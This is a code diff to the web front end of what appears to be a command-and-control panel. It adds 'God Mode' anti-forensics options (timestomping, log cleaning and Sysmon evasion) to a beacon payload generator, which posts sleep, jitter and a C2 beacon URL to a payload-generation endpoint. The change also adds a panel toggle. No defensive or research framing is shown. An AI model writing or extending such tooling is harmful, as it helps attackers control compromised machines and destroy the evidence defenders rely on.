@@ -1205,6 +1205,15 @@ async function generatePayload() {
         const sleep = parseInt(document.getElementById('payloadSleep').value) || 30;
         const jitter = parseInt(document.getElementById('payloadJitter').value) || 10;
         
+        // Collect God Mode options
+        const godModeEnabled = document.getElementById('godModePayload').checked;
+        const gmOptions = {
+            enabled: godModeEnabled,
+            timestomp: document.getElementById('gmPyTimestomp').checked,
+            clean_logs: document.getElementById('gmPyCleanLogs').checked,
+            sysmon_evade: document.getElementById('gmPySysmonEvade').checked
+        };
+        
         const res = await fetch('/c2/payloads/generate', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -1213,7 +1222,8 @@ async function generatePayload() {
                 c2_url: window.location.origin + '/c2/beacon',
                 options: {
                     sleep: sleep,
-                    jitter: jitter
+                    jitter: jitter,
+                    god_mode: gmOptions
                 }
             })
         });
@@ -1333,6 +1343,17 @@ async function quickDeploy() {
         alert('Error: ' + e);
     }
 }
+
+// Toggle God Mode Anti-Forensics panel
+document.addEventListener('DOMContentLoaded', function() {
+    const godModeCheckbox = document.getElementById('godModePayload');
+    const godModeOpts = document.getElementById('godModePayloadOpts');
+    if (godModeCheckbox && godModeOpts) {
+        godModeCheckbox.addEventListener('change', function() {
+            godModeOpts.style.display = this.checked ? 'block' : 'none';
+        });
+    }
+});
 
 // Auto refresh every 15 seconds
 const beaconPollInterval = setInterval(() => {
